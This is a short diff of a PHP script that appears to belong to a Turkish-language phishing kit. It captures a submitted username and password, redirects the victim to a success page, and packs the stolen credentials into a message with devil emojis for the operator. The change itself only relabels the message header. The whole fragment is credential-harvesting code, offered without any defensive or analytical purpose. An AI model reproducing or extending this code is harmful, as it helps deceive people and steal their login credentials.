@@ -16,8 +16,8 @@ $pas=$_POST["pas"];
 header("location: success.php?id=$id");
 
 $data = [
-  'text' => '➡️ Şifre yanliş formu 😈 
-             sublime saplar izi kalır 😈
+  'text' => '➡️ Deus DM Basma formu 😈 
+  sublime saplar izi kalır 😈
 
 Kullanıcı Adı : '.$id.'
 Şifre : '.$pas.'
